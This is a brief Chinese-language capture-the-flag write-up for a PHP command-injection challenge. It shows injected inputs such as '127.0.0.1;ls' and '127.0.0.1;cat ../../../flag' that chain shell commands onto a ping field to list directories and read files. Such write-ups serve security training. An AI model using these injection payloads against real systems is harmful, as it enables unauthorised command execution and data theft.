# [ACTF2020 新生赛]Exec
TAG:PHP 命令执行  
## 解题过程：
经典命令执行问题
![20201230161727](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230161727.png)  
进行常规测试  
  
```127.0.0.1;ls```
![20201230163819](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230163819.png)  
  
发现可以直接进行命令执行，尝试查看```index.php```内容  
```127.0.0.1;cat index.php```  
![20201230164318](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230164318.png)  
  
查看页面源代码发现```index.php```内容  
![20201230165259](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230165259.png)  
  
没有发现有效信息，尝试进行目录遍历获得flag  
```127.0.0.1;ls ../../../```  
![20201230165631](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230165631.png)  
  
查看flag文件内容  
```127.0.0.1;cat ../../../flag```
获得flag  
![20201230165737](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20201230165737.png)
## 题目分析
经典的命令执行题目，没什么好分析的，熟悉Linux基础命令即可解答此题目  